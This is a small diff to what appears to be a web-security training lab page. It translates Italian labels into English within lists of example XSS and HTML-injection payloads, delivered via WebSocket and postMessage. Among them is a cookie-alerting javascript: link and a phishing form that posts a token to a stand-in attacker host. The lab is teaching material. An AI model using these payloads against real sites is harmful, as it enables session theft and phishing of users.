@@ -266,7 +266,7 @@ fetch('http://localhost:3000/api/user')
     <p class="hint"><strong>Examples of malicious messages:</strong></p>
     <ul class="examples">
       <li><code>&lt;img src=x onerror=alert('WS-XSS')&gt;</code> — XSS via WebSocket</li>
-      <li><code>&lt;a href="javascript:alert(document.cookie)"&gt;Clicca&lt;/a&gt;</code> — JS link in the message</li>
+      <li><code>&lt;a href="javascript:alert(document.cookie)"&gt;Click&lt;/a&gt;</code> — JS link in the message</li>
       <li><code>&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;z-index:9999"&gt;HACKED&lt;/div&gt;</code> — overlay</li>
     </ul>
     <div class="lab-area">
@@ -303,7 +303,7 @@ ws.onmessage = (e) => {
     <ul class="examples">
       <li><code>window.postMessage('&lt;b&gt;Iniettato!&lt;/b&gt;','*')</code> — HTML injection via postMessage</li>
       <li><code>window.postMessage('&lt;img src=x onerror=alert(document.domain)&gt;','*')</code> — XSS via postMessage</li>
-      <li><code>window.postMessage('&lt;form action=https://evil.example.com&gt;&lt;input name=token&gt;&lt;button&gt;Invia&lt;/button&gt;&lt;/form&gt;','*')</code> — injected phishing form</li>
+      <li><code>window.postMessage('&lt;form action=https://evil.example.com&gt;&lt;input name=token&gt;&lt;button&gt;Send&lt;/button&gt;&lt;/form&gt;','*')</code> — injected phishing form</li>
     </ul>
     <div class="lab-area">
       <input type="text" id="msg-input" placeholder="Message to send via postMessage…">
